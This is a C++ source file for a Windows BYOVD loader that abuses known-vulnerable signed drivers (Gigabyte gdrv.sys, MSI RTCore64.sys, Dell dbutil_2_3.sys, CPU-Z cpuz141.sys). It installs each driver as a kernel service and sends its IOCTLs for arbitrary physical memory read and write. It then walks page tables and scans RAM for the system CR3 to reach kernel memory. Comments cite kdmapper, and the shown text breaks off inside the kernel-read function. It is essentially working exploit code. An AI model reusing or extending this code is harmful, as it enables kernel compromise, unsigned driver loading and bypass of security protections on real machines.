#include "vuln_driver.h"
#include "debug_log.h"

#include <stdio.h>
#include <cstring>
#include <string>
#include <utility>
#include <vector>

#pragma comment(lib, "advapi32.lib")

namespace
{
    static VulnDriverType g_type = VulnDriverType::Gdrv;
    static HANDLE g_device = INVALID_HANDLE_VALUE;
    static bool g_scmLoaded = false;
    static std::wstring g_loadedPath;
    static uint64_t g_systemCr3 = 0;

    // --- Gigabyte gdrv.sys ---------------------------------------------------
    static constexpr DWORD IOCTL_GIO_MEMCPY = 0xC3502804;

    struct GioMemcpy
    {
        uint64_t dst;
        uint64_t src;
        uint32_t size;
    };

    // --- MSI RTCore64.sys ----------------------------------------------------
    static constexpr DWORD IOCTL_RTC_READ_PHYS = 0x80002048;
    static constexpr DWORD IOCTL_RTC_WRITE_PHYS = 0x8000204C;

// MSI RTCore64 physical IOCTL layout (kdmapper / Afterburner). Result is in `value`,
// not a usermode pointer. Size must be 1, 2, or 4.
#pragma pack(push, 1)
    struct RtCore64Memory
    {
        uint8_t pad0[8];
        uint64_t address;
        uint8_t pad1[8];
        uint32_t size;
        uint32_t value;
        uint8_t pad3[16];
    };
#pragma pack(pop)

    // --- Dell dbutil_2_3.sys -------------------------------------------------
    static constexpr DWORD IOCTL_DBUTIL_READ = 0x9B0C1EC4;
    static constexpr DWORD IOCTL_DBUTIL_WRITE = 0x9B0C1EC8;

    struct DbutilBuffer
    {
        uint64_t unused;
        uint64_t address;
        uint64_t buffer;
        uint32_t size;
        uint32_t pad;
    };

    // --- CPU-Z cpuz141.sys (same physical layout as RTCore64) ----------------
    static constexpr DWORD IOCTL_CPUZ_READ = 0x9C402084;
    static constexpr DWORD IOCTL_CPUZ_WRITE = 0x9C402088;

    bool EnableLoadDriverPrivilege()
    {
        HANDLE token = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
            return false;

        LUID luid{};
        if (!LookupPrivilegeValueA(nullptr, SE_LOAD_DRIVER_NAME, &luid))
        {
            CloseHandle(token);
            return false;
        }

        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        const BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        CloseHandle(token);
        return ok && GetLastError() != ERROR_NOT_ALL_ASSIGNED;
    }

    // Direct SCM API (no sc.exe). Logs before StartService so BSOD still leaves a trail on Z:.
    bool WaitServiceState(SC_HANDLE svc, DWORD wantState, DWORD timeoutMs, DWORD* outState, DWORD* outWin32)
    {
        SERVICE_STATUS_PROCESS ssp{};
        DWORD needed = 0;
        const DWORD start = GetTickCount();
        while (true)
        {
            if (!QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp),
                                      sizeof(ssp), &needed))
            {
                if (outWin32) *outWin32 = GetLastError();
                return false;
            }
            if (outState) *outState = ssp.dwCurrentState;
            if (ssp.dwCurrentState == wantState)
                return true;
            if (GetTickCount() - start >= timeoutMs)
            {
                if (outWin32) *outWin32 = ERROR_TIMEOUT;
                return false;
            }
            Sleep(100);
        }
    }

    void DeleteServiceQuiet(SC_HANDLE scm, const wchar_t* serviceName)
    {
        SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
        if (!svc)
            return;
        SERVICE_STATUS st{};
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DWORD state = 0, win32 = 0;
        WaitServiceState(svc, SERVICE_STOPPED, 3000, &state, &win32);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }

    bool LoadViaScm(const wchar_t* serviceName, const wchar_t* sysPath)
    {
        EnableLoadDriverPrivilege();

        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!scm)
        {
            const DWORD err = GetLastError();
            printf("[-] SCM: OpenSCManager failed Win32=%lu\n", err);
            fflush(stdout);
            char dataJson[64];
            sprintf_s(dataJson, "{\"win32\":%lu}", err);
            AgentDebugLog("P", "vuln_driver.cpp:LoadViaScm", "scm_open_manager_failed", dataJson);
            return false;
        }

        // Leftover service from prior BSOD / crashed start.
        DeleteServiceQuiet(scm, serviceName);
        AgentDebugLog("F", "vuln_driver.cpp:LoadViaScm", "scm_cleanup_done", "{}");

        wchar_t fullPath[MAX_PATH]{};
        const wchar_t* binPath = sysPath;
        if (sysPath && GetFullPathNameW(sysPath, MAX_PATH, fullPath, nullptr) != 0)
            binPath = fullPath;

        printf("[*] SCM: CreateService %ls binPath=\"%ls\"\n", serviceName, binPath);
        fflush(stdout);
        AgentDebugLog("F", "vuln_driver.cpp:LoadViaScm", "scm_create_start", "{}");

        SC_HANDLE svc = CreateServiceW(
            scm, serviceName, serviceName,
            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
            binPath, nullptr, nullptr, nullptr, nullptr, nullptr);

        if (!svc)
        {
            const DWORD err = GetLastError();
            if (err == ERROR_SERVICE_EXISTS)
            {
                svc = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
            }
            if (!svc)
            {
                printf("[-] SCM: CreateService/OpenService failed Win32=%lu\n", err);
                fflush(stdout);
                char dataJson[64];
                sprintf_s(dataJson, "{\"win32\":%lu}", err);
                AgentDebugLog("O", "vuln_driver.cpp:LoadViaScm", "scm_create_failed", dataJson);
                CloseServiceHandle(scm);
                return false;
            }
        }

        printf("[+] SCM: CreateService OK, StartService %ls...\n", serviceName);
        fflush(stdout);
        // CRITICAL: if DriverEntry BSODs, this is the last line that must reach Z:\
        AgentDebugLog("L", "vuln_driver.cpp:LoadViaScm", "scm_start_before", "{}");
        printf("[*] SCM: calling StartService (gdrv DriverEntry)...\n");
        fflush(stdout);

        const DWORD startTick = GetTickCount();
        BOOL started = StartServiceW(svc, 0, nullptr);
        DWORD startErr = started ? 0 : GetLastError();
        if (!started && startErr == ERROR_SERVICE_ALREADY_RUNNING)
        {
            started = TRUE;
            startErr = 0;
        }

        {
            char dataJson[128];
            sprintf_s(dataJson, "{\"started\":%s,\"win32\":%lu,\"elapsedMs\":%lu}",
                      started ? "true" : "false", startErr, GetTickCount() - startTick);
            AgentDebugLog(started ? "L" : "O", "vuln_driver.cpp:LoadViaScm", "scm_start_result", dataJson);
        }

        if (!started)
        {
            printf("[-] SCM: StartService failed Win32=%lu\n", startErr);
            fflush(stdout);
            DeleteService(svc);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return false;
        }

        DWORD state = 0, win32 = 0;
        const bool running = WaitServiceState(svc, SERVICE_RUNNING, 10000, &state, &win32);
        {
            char dataJson[128];
            sprintf_s(dataJson, "{\"running\":%s,\"state\":%lu,\"win32\":%lu}",
                      running ? "true" : "false", state, win32);
            AgentDebugLog(running ? "L" : "M", "vuln_driver.cpp:LoadViaScm", "scm_wait_running", dataJson);
        }

        if (!running)
        {
            printf("[-] SCM: service did not reach RUNNING (state=%lu win32=%lu)\n", state, win32);
            fflush(stdout);
            SERVICE_STATUS st{};
            ControlService(svc, SERVICE_CONTROL_STOP, &st);
            DeleteService(svc);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return false;
        }

        printf("[+] SCM: StartService OK (%ls) state=RUNNING\n", serviceName);
        fflush(stdout);
        AgentDebugLog("L", "vuln_driver.cpp:LoadViaScm", "scm_start_ok", "{}");
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        return true;
    }

    void UnloadViaScm(const wchar_t* serviceName)
    {
        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!scm)
            return;
        DeleteServiceQuiet(scm, serviceName);
        CloseServiceHandle(scm);
        AgentDebugLog("F", "vuln_driver.cpp:UnloadViaScm", "scm_unload_done", "{}");
    }

    std::wstring GetExeDirectory()
    {
        wchar_t path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, path, MAX_PATH);
        std::wstring s(path);
        const size_t slash = s.find_last_of(L"\\/");
        if (slash != std::wstring::npos)
            s.resize(slash);
        return s;
    }

    std::wstring EnsureDirSlash(std::wstring dir)
    {
        if (!dir.empty() && dir.back() != L'\\' && dir.back() != L'/')
            dir += L'\\';
        return dir;
    }

    std::wstring NormalizeExistingDirectory(const std::wstring& dir)
    {
        if (dir.empty())
            return dir;

        wchar_t full[MAX_PATH]{};
        if (GetFullPathNameW(dir.c_str(), MAX_PATH, full, nullptr) == 0)
            return EnsureDirSlash(dir);

        std::wstring normalized(full);
        if (GetFileAttributesW(normalized.c_str()) == INVALID_FILE_ATTRIBUTES)
            return std::wstring();

        return EnsureDirSlash(normalized);
    }

    std::wstring GetRepoDriversDirectory()
    {
        // release\ImGui.exe -> <repo>\drivers
        return NormalizeExistingDirectory(GetExeDirectory() + L"\\..\\drivers");
    }

    static uint32_t RtCoreChunkSize(uint64_t addr, uint32_t remaining)
    {
        if ((addr & 3) == 0 && remaining >= 4)
            return 4;
        if ((addr & 1) == 0 && remaining >= 2)
            return 2;
        return 1;
    }

    bool ReadPhysicalRtCore(HANDLE device, uint64_t phys, void* buffer, uint32_t size)
    {
        if (!device || device == INVALID_HANDLE_VALUE || !buffer || size == 0)
            return false;

        auto* out = static_cast<uint8_t*>(buffer);
        uint32_t done = 0;
        while (done < size)
        {
            const uint64_t addr = phys + done;
            const uint32_t chunk = RtCoreChunkSize(addr, size - done);
            RtCore64Memory req{};
            req.address = addr;
            req.size = chunk;
            DWORD returned = 0;
            if (!DeviceIoControl(device, IOCTL_RTC_READ_PHYS, &req, sizeof(req), &req, sizeof(req),
                                 &returned, nullptr))
            {
                return false;
            }
            memcpy(out + done, &req.value, chunk);
            done += chunk;
        }
        return true;
    }

    bool WritePhysicalRtCore(HANDLE device, uint64_t phys, const void* buffer, uint32_t size)
    {
        if (!device || device == INVALID_HANDLE_VALUE || !buffer || size == 0)
            return false;

        const auto* in = static_cast<const uint8_t*>(buffer);
        uint32_t done = 0;
        while (done < size)
        {
            const uint64_t addr = phys + done;
            const uint32_t chunk = RtCoreChunkSize(addr, size - done);
            RtCore64Memory req{};
            req.address = addr;
            req.size = chunk;
            memcpy(&req.value, in + done, chunk);
            DWORD returned = 0;
            if (!DeviceIoControl(device, IOCTL_RTC_WRITE_PHYS, &req, sizeof(req), &req, sizeof(req),
                                 &returned, nullptr))
            {
                return false;
            }
            done += chunk;
        }
        return true;
    }

    bool ReadPhysicalCpuz(HANDLE device, uint64_t phys, void* buffer, uint32_t size)
    {
        struct
        {
            uint64_t address;
            uint32_t size;
            uint32_t pad;
            uint64_t buffer;
        } req{};

        req.address = phys;
        req.size = size;
        req.buffer = reinterpret_cast<uint64_t>(buffer);

        DWORD returned = 0;
        return DeviceIoControl(device, IOCTL_CPUZ_READ, &req, sizeof(req), &req, sizeof(req), &returned, nullptr) != FALSE;
    }

    bool WritePhysicalCpuz(HANDLE device, uint64_t phys, const void* buffer, uint32_t size)
    {
        struct
        {
            uint64_t address;
            uint32_t size;
            uint32_t pad;
            uint64_t buffer;
        } req{};

        req.address = phys;
        req.size = size;
        req.buffer = reinterpret_cast<uint64_t>(const_cast<void*>(buffer));

        DWORD returned = 0;
        return DeviceIoControl(device, IOCTL_CPUZ_WRITE, &req, sizeof(req), &req, sizeof(req), &returned, nullptr) != FALSE;
    }

    bool VirtToPhys(uint64_t virt, uint64_t cr3, uint64_t* physOut)
    {
        if (!g_device || g_device == INVALID_HANDLE_VALUE || cr3 == 0)
            return false;

        const auto readPhys = [&](uint64_t phys, void* out, size_t sz) -> bool
        {
            if (g_type == VulnDriverType::RTCore64)
                return ReadPhysicalRtCore(g_device, phys, out, static_cast<uint32_t>(sz));
            if (g_type == VulnDriverType::Cpuz)
                return ReadPhysicalCpuz(g_device, phys, out, static_cast<uint32_t>(sz));
            return false;
        };

        uint64_t pml4Index = (virt >> 39) & 0x1FF;
        uint64_t pdptIndex = (virt >> 30) & 0x1FF;
        uint64_t pdIndex = (virt >> 21) & 0x1FF;
        uint64_t ptIndex = (virt >> 12) & 0x1FF;
        uint64_t offset = virt & 0xFFF;

        uint64_t pml4e = 0;
        if (!readPhys((cr3 & ~0xFFFULL) + pml4Index * 8, &pml4e, 8) || !(pml4e & 1))
            return false;

        uint64_t pdpte = 0;
        if (!readPhys((pml4e & 0x000FFFFFFFFFF000ULL) + pdptIndex * 8, &pdpte, 8) || !(pdpte & 1))
            return false;
        if (pdpte & 0x80)
        {
            *physOut = (pdpte & 0x000FFFFFC0000000ULL) + (virt & 0x3FFFFFFFULL);
            return true;
        }

        uint64_t pde = 0;
        if (!readPhys((pdpte & 0x000FFFFFFFFFF000ULL) + pdIndex * 8, &pde, 8) || !(pde & 1))
            return false;
        if (pde & 0x80)
        {
            *physOut = (pde & 0x000FFFFFFFE00000ULL) + (virt & 0x1FFFFFULL);
            return true;
        }

        uint64_t pte = 0;
        if (!readPhys((pde & 0x000FFFFFFFFFF000ULL) + ptIndex * 8, &pte, 8) || !(pte & 1))
            return false;

        *physOut = (pte & 0x000FFFFFFFFFF000ULL) + offset;
        return true;
    }

    bool ReadPhysical(void* buffer, uint64_t phys, size_t size)
    {
        if (g_type == VulnDriverType::RTCore64)
            return ReadPhysicalRtCore(g_device, phys, buffer, static_cast<uint32_t>(size));
        if (g_type == VulnDriverType::Cpuz)
            return ReadPhysicalCpuz(g_device, phys, buffer, static_cast<uint32_t>(size));
        return false;
    }
}

const VulnDriverInfo& GetVulnDriverInfo(VulnDriverType type)
{
    static const VulnDriverInfo kTable[] = {
        { VulnDriverType::Gdrv,     L"Gigabyte gdrv.sys",     L"gdrv.sys",         L"\\\\.\\GIO",          L"GIOMap",     L"\\Driver\\GIO" },
        { VulnDriverType::RTCore64, L"MSI RTCore64.sys",      L"RTCore64.sys",     L"\\\\.\\RTCore64",     L"RTCoreMap",  L"\\Driver\\RTCore64" },
        { VulnDriverType::Dbutil,   L"Dell dbutil_2_3.sys",   L"dbutil_2_3.sys",   L"\\\\.\\DBUtil_2_3",   L"DBUtilMap",  L"\\Driver\\DBUtil_2_3" },
        { VulnDriverType::Cpuz,     L"CPU-Z cpuz141.sys",     L"cpuz141.sys",      L"\\\\.\\cpuz141",      L"CpuzMap",    L"\\Driver\\cpuz141" },
    };
    const int idx = static_cast<int>(type);
    if (idx < 0 || idx >= static_cast<int>(VulnDriverType::Count))
        return kTable[0];
    return kTable[idx];
}

const wchar_t* VulnDriverTypeName(VulnDriverType type)
{
    return GetVulnDriverInfo(type).displayName;
}

std::vector<std::wstring> GetDriverSearchRoots()
{
    std::vector<std::wstring> roots;

    const std::wstring exeDrivers = NormalizeExistingDirectory(GetExeDirectory() + L"\\drivers");
    if (!exeDrivers.empty())
        roots.push_back(exeDrivers);

    const std::wstring repoDrivers = GetRepoDriversDirectory();
    if (!repoDrivers.empty() && repoDrivers != exeDrivers)
        roots.push_back(repoDrivers);

    const std::wstring exeDir = NormalizeExistingDirectory(GetExeDirectory());
    if (!exeDir.empty() && exeDir != exeDrivers)
        roots.push_back(exeDir);

    wchar_t desktopDrivers[MAX_PATH]{};
    if (ExpandEnvironmentStringsW(L"%USERPROFILE%\\Desktop\\Drivers", desktopDrivers, MAX_PATH))
    {
        const std::wstring desktop = NormalizeExistingDirectory(desktopDrivers);
        if (!desktop.empty())
            roots.push_back(desktop);
    }

    wchar_t fromEnv[MAX_PATH]{};
    if (GetEnvironmentVariableW(L"LOADER_DRIVERS_DIR", fromEnv, MAX_PATH) > 0)
    {
        const std::wstring envDir = NormalizeExistingDirectory(fromEnv);
        if (!envDir.empty())
            roots.push_back(envDir);
    }

    return roots;
}

static std::wstring CanonicalizeExistingPath(const std::wstring& path)
{
    wchar_t full[MAX_PATH]{};
    if (GetFullPathNameW(path.c_str(), MAX_PATH, full, nullptr) != 0)
        return full;
    return path;
}

std::wstring ResolveDriverFile(const std::wstring& fileNameOrPath)
{
    if (fileNameOrPath.empty())
        return fileNameOrPath;

    std::wstring path = fileNameOrPath;
    if (path.find(L".sys") == std::wstring::npos && path.find(L".SYS") == std::wstring::npos)
        path += L".sys";

    if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES)
        return CanonicalizeExistingPath(path);

    const std::wstring baseName = path.substr(path.find_last_of(L"\\/") + 1);
    for (const std::wstring& root : GetDriverSearchRoots())
    {
        const std::wstring candidate = root + baseName;
        if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES)
            return CanonicalizeExistingPath(candidate);
    }

    return path;
}

std::wstring VulnDriverDefaultPath(VulnDriverType type)
{
    return ResolveDriverFile(GetVulnDriverInfo(type).defaultFileName);
}

#ifndef CmResourceTypeMemory
#define CmResourceTypeMemory 3
#endif
#ifndef CmResourceTypeMemoryLarge
#define CmResourceTypeMemoryLarge 7
#endif
#ifndef CM_RESOURCE_MEMORY_LARGE_40
#define CM_RESOURCE_MEMORY_LARGE_40 0x0200
#endif
#ifndef CM_RESOURCE_MEMORY_LARGE_48
#define CM_RESOURCE_MEMORY_LARGE_48 0x0400
#endif
#ifndef CM_RESOURCE_MEMORY_LARGE_64
#define CM_RESOURCE_MEMORY_LARGE_64 0x0800
#endif

#pragma pack(push, 4)
struct PhysCmPartialDesc
{
    UCHAR Type;
    UCHAR ShareDisposition;
    USHORT Flags;
    LARGE_INTEGER Start;
    ULONG Length;
};
#pragma pack(pop)

static std::vector<std::pair<uint64_t, uint64_t>> GetPhysicalMemoryRanges()
{
    std::vector<std::pair<uint64_t, uint64_t>> ranges;

    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
                      0, KEY_READ, &key) == ERROR_SUCCESS)
    {
        DWORD type = 0, size = 0;
        if (RegQueryValueExW(key, L".Translated", nullptr, &type, nullptr, &size) == ERROR_SUCCESS &&
            size >= 20)
        {
            std::vector<BYTE> data(size);
            if (RegQueryValueExW(key, L".Translated", nullptr, &type, data.data(), &size) == ERROR_SUCCESS)
            {
                const BYTE* p = data.data();
                const BYTE* end = data.data() + size;
                if (p + 4 <= end)
                {
                    const DWORD listCount = *reinterpret_cast<const DWORD*>(p);
                    p += 4;
                    for (DWORD i = 0; i < listCount && p + 16 <= end; ++i)
                    {
                        p += 8; // InterfaceType + BusNumber
                        if (p + 8 > end)
                            break;
                        p += 4; // Version + Revision
                        const DWORD partCount = *reinterpret_cast<const DWORD*>(p);
                        p += 4;
                        for (DWORD j = 0; j < partCount && p + sizeof(PhysCmPartialDesc) <= end; ++j)
                        {
                            PhysCmPartialDesc desc{};
                            memcpy(&desc, p, sizeof(desc));
                            p += sizeof(desc);

                            uint64_t length = desc.Length;
                            if (desc.Type == CmResourceTypeMemoryLarge)
                            {
                                if (desc.Flags & CM_RESOURCE_MEMORY_LARGE_64)
                                    length <<= 32;
                                else if (desc.Flags & CM_RESOURCE_MEMORY_LARGE_48)
                                    length <<= 16;
                                else if (desc.Flags & CM_RESOURCE_MEMORY_LARGE_40)
                                    length <<= 8;
                            }
                            else if (desc.Type != CmResourceTypeMemory)
                            {
                                continue;
                            }

                            const uint64_t start = static_cast<uint64_t>(desc.Start.QuadPart);
                            if (length == 0)
                                continue;
                            ranges.push_back({ start, start + length });
                        }
                    }
                }
            }
        }
        RegCloseKey(key);
    }

    if (ranges.empty())
    {
        MEMORYSTATUSEX ms{};
        ms.dwLength = sizeof(ms);
        if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys > 0x2000)
            ranges.push_back({ 0x1000, ms.ullTotalPhys });
        else
            ranges.push_back({ 0x1000, 0x100000000ULL });
        printf("[*] Physical RAM map unavailable; falling back to 0x%llX bytes\n",
               static_cast<unsigned long long>(ranges.back().second));
    }
    else
    {
        printf("[*] Physical RAM map: %zu range(s)\n", ranges.size());
        for (const auto& r : ranges)
        {
            printf("    0x%llX - 0x%llX (%llu MB)\n",
                   static_cast<unsigned long long>(r.first),
                   static_cast<unsigned long long>(r.second),
                   static_cast<unsigned long long>((r.second - r.first) / (1024 * 1024)));
        }
    }
    fflush(stdout);
    return ranges;
}

bool FindSystemCr3(uint64_t* outCr3)
{
    if (!outCr3 || !VulnDriverIsLoaded())
        return false;

    if (g_systemCr3 != 0)
    {
        *outCr3 = g_systemCr3;
        return true;
    }

    if (g_type != VulnDriverType::RTCore64 && g_type != VulnDriverType::Cpuz)
        return false;

    const auto ranges = GetPhysicalMemoryRanges();

    auto probeAt = [](uint64_t phys, uint32_t nbytes, uint32_t* valueOut, DWORD* errOut) -> bool {
        uint32_t tmp = 0;
        SetLastError(0);
        const bool ok = ReadPhysical(&tmp, phys, nbytes);
        if (errOut)
            *errOut = GetLastError();
        if (valueOut)
            *valueOut = tmp;
        return ok;
    };

    uint32_t lowProbe = 0;
    DWORD lowErr = 0;
    const bool lowOk = probeAt(0x1000, 4, &lowProbe, &lowErr);
    printf("[*] Physical probe 0x1000: %s value=0x%08X win32=%lu (%s %s)\n",
           lowOk ? "ok" : "FAIL", lowProbe, lowErr, __DATE__, __TIME__);
    fflush(stdout);
    // #region agent log
    {
        char dataJson[256];
        sprintf_s(dataJson,
                  "{\"probeOk\":%s,\"probe\":%u,\"win32\":%lu,\"date\":\"%s\",\"time\":\"%s\"}",
                  lowOk ? "true" : "false", lowProbe, lowErr, __DATE__, __TIME__);
        AgentDebugLog(lowOk ? "C" : "B", "vuln_driver.cpp:FindSystemCr3", "phys_probe_0x1000", dataJson);
    }
    // #endregion

    bool anyRead = lowOk;
    uint64_t workingPhys = lowOk ? 0x1000 : 0;
    const uint32_t trySizes[] = { 4, 2, 1 };
    for (const auto& range : ranges)
    {
        uint64_t page = (range.first + 0xFFF) & ~0xFFFULL;
        if (page < 0x1000)
            page = 0x1000;
        if (!lowOk && page == 0x1000)
            page += 0x1000;
        if (page + 4 > range.second)
            continue;
        for (uint32_t nbytes : trySizes)
        {
            uint32_t val = 0;
            DWORD err = 0;
            if (probeAt(page, nbytes, &val, &err))
            {
                anyRead = true;
                workingPhys = page;
                printf("[*] Physical probe 0x%llX size=%u: ok value=0x%08X\n",
                       static_cast<unsigned long long>(page), nbytes, val);
                fflush(stdout);
                // #region agent log
                {
                    char dataJson[192];
                    sprintf_s(dataJson,
                              "{\"phys\":%llu,\"size\":%u,\"value\":%u,\"win32\":0}",
                              static_cast<unsigned long long>(page), nbytes, val);
                    AgentDebugLog("B", "vuln_driver.cpp:FindSystemCr3", "phys_probe_ram_ok", dataJson);
                }
                // #endregion
                goto probe_done;
            }
            printf("[*] Physical probe 0x%llX size=%u: FAIL win32=%lu\n",
                   static_cast<unsigned long long>(page), nbytes, err);
            fflush(stdout);
            // #region agent log
            {
                char dataJson[160];
                sprintf_s(dataJson, "{\"phys\":%llu,\"size\":%u,\"win32\":%lu}",
                          static_cast<unsigned long long>(page), nbytes, err);
                AgentDebugLog("B", "vuln_driver.cpp:FindSystemCr3", "phys_probe_ram_fail", dataJson);
            }
            // #endregion
        }
        if (anyRead)
            break;
    }
probe_done:
    if (!anyRead)
    {
        printf("[-] RTCore physical reads rejected (Win32 87/invalid). Cannot find CR3 in this VM.\n");
        fflush(stdout);
        // #region agent log
        AgentDebugLog("B", "vuln_driver.cpp:FindSystemCr3", "phys_all_probes_failed", "{}");
        // #endregion
        return false;
    }
    (void)workingPhys;
    // #region agent log
    {
        char dataJson[256];
        const unsigned long long r0s = ranges.empty() ? 0 : ranges.front().first;
        const unsigned long long r0e = ranges.empty() ? 0 : ranges.front().second;
        sprintf_s(dataJson, "{\"rangeCount\":%zu,\"r0start\":%llu,\"r0end\":%llu}",
                  ranges.size(), r0s, r0e);
        AgentDebugLog("D", "vuln_driver.cpp:FindSystemCr3", "phys_ram_map", dataJson);
    }
    // #endregion
    uint64_t pages = 0;
    uint64_t readsOk = 0;
    uint64_t firstNzEntry = 0;
    uint64_t firstNzPage = 0;

    for (const auto& range : ranges)
    {
        uint64_t page = (range.first + 0xFFF) & ~0xFFFULL;
        if (page == 0)
            page = 0x1000;
        const uint64_t end = range.second;
        for (; page + 0x1000 <= end; page += 0x1000)
        {
            ++pages;
            uint64_t entry = 0;
            if (!ReadPhysical(&entry, page + 0x1ED * 8, sizeof(entry)))
                continue;
            ++readsOk;
            if (firstNzEntry == 0 && entry != 0)
            {
                firstNzEntry = entry;
                firstNzPage = page;
            }
            if ((entry & 0x000FFFFFFFFFF000ULL) == page && (entry & 1))
            {
                g_systemCr3 = page;
                *outCr3 = page;
                printf("[+] System CR3 = 0x%llX (scanned %llu pages, reads_ok=%llu)\n",
                       static_cast<unsigned long long>(page),
                       static_cast<unsigned long long>(pages),
                       static_cast<unsigned long long>(readsOk));
                fflush(stdout);
                // #region agent log
                {
                    char dataJson[192];
                    sprintf_s(dataJson, "{\"cr3\":%llu,\"pages\":%llu,\"readsOk\":%llu}",
                              static_cast<unsigned long long>(page),
                              static_cast<unsigned long long>(pages),
                              static_cast<unsigned long long>(readsOk));
                    AgentDebugLog("E", "vuln_driver.cpp:FindSystemCr3", "cr3_found", dataJson);
                }
                // #endregion
                return true;
            }
        }
    }

    printf("[-] System CR3 not found (scanned %llu pages, reads_ok=%llu firstNz=0x%llX @0x%llX)\n",
           static_cast<unsigned long long>(pages),
           static_cast<unsigned long long>(readsOk),
           static_cast<unsigned long long>(firstNzEntry),
           static_cast<unsigned long long>(firstNzPage));
    fflush(stdout);
    // #region agent log
    {
        char dataJson[256];
        sprintf_s(dataJson,
                  "{\"pages\":%llu,\"readsOk\":%llu,\"firstNzEntry\":%llu,\"firstNzPage\":%llu}",
                  static_cast<unsigned long long>(pages),
                  static_cast<unsigned long long>(readsOk),
                  static_cast<unsigned long long>(firstNzEntry),
                  static_cast<unsigned long long>(firstNzPage));
        AgentDebugLog("E", "vuln_driver.cpp:FindSystemCr3", "cr3_not_found", dataJson);
    }
    // #endregion
    return false;
}

bool VulnDriverLoad(VulnDriverType type, const wchar_t* sysPath, std::wstring* errorOut)
{
    if (errorOut) errorOut->clear();

    if (VulnDriverIsLoaded())
        VulnDriverUnload();

    g_type = type;
    g_systemCr3 = 0;

    const auto& info = GetVulnDriverInfo(type);
    std::wstring path = sysPath;
    if (path.empty())
        path = VulnDriverDefaultPath(type);

    if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES)
    {
        printf("[-] BYOVD: driver file not found: %ls\n", path.c_str());
        fflush(stdout);
        if (errorOut)
            *errorOut = L"Vulnerable driver not found: " + path;
        return false;
    }

    printf("[*] BYOVD: loading %ls (service=%ls device=%ls)\n",
           path.c_str(), info.serviceName, info.devicePath);
    fflush(stdout);
    AgentDebugLog("F", "vuln_driver.cpp:VulnDriverLoad", "byovd_load_start", "{}");

    if (!LoadViaScm(info.serviceName, path.c_str()))
    {
        printf("[-] BYOVD: SCM load failed\n");
        fflush(stdout);
        AgentDebugLog("F", "vuln_driver.cpp:VulnDriverLoad", "byovd_scm_failed", "{}");
        if (errorOut)
            *errorOut = L"Failed to load vulnerable driver via SCM (need admin + test signing off).";
        return false;
    }

    g_scmLoaded = true;
    g_loadedPath = path;

    printf("[*] BYOVD: opening device %ls...\n", info.devicePath);
    fflush(stdout);
    AgentDebugLog("F", "vuln_driver.cpp:VulnDriverLoad", "byovd_open_device", "{}");

    g_device = CreateFileW(info.devicePath, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_device == INVALID_HANDLE_VALUE && type == VulnDriverType::Gdrv)
    {
        printf("[*] BYOVD: retrying CreateFile on \\\\.\\Gdrv ...\n");
        fflush(stdout);
        g_device = CreateFileW(L"\\\\.\\Gdrv", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }

    if (g_device == INVALID_HANDLE_VALUE)
    {
        if (errorOut)
        {
            *errorOut = L"Failed to open device (";
            *errorOut += info.devicePath;
            *errorOut += L"). Win32 error ";
            *errorOut += std::to_wstring(GetLastError());
        }
        printf("[-] BYOVD: CreateFile failed (Win32 error %lu)\n", GetLastError());
        fflush(stdout);
        AgentDebugLog("F", "vuln_driver.cpp:VulnDriverLoad", "byovd_open_failed", "{}");
        UnloadViaScm(info.serviceName);
        g_scmLoaded = false;
        return false;
    }

    printf("[+] BYOVD: device handle OK\n");
    fflush(stdout);
    AgentDebugLog("F", "vuln_driver.cpp:VulnDriverLoad", "byovd_device_ok", "{}");

    if (g_type == VulnDriverType::RTCore64 || g_type == VulnDriverType::Cpuz)
    {
        uint64_t cr3 = 0;
        if (!FindSystemCr3(&cr3))
        {
            if (errorOut)
                *errorOut = L"Failed to locate system CR3 for physical-memory driver.";
            VulnDriverUnload();
            return false;
        }
    }

    return true;
}

void VulnDriverUnload()
{
    if (g_device != INVALID_HANDLE_VALUE)
    {
        CloseHandle(g_device);
        g_device = INVALID_HANDLE_VALUE;
    }

    if (g_scmLoaded)
    {
        const auto& info = GetVulnDriverInfo(g_type);
        UnloadViaScm(info.serviceName);
        g_scmLoaded = false;
    }

    g_systemCr3 = 0;
    g_loadedPath.clear();
}

bool VulnDriverIsLoaded()
{
    return g_device != INVALID_HANDLE_VALUE;
}

VulnDriverType VulnDriverGetLoadedType()
{
    return g_type;
}

HANDLE VulnDriverDevice()
{
    return g_device;
}

std::wstring VulnDriverLoadedPath()
{
    return g_loadedPath;
}

bool VulnReadKernelMemory(uint64_t address, void* buffer, size_t size)
{
    if (!VulnDriverIsLoaded() || !buffer || size == 0)
        return false;

    if (g_type == VulnDriverType::Gdrv)
    {
        std::vector<uint8_t> tmp(size);
        GioMemcpy req{};
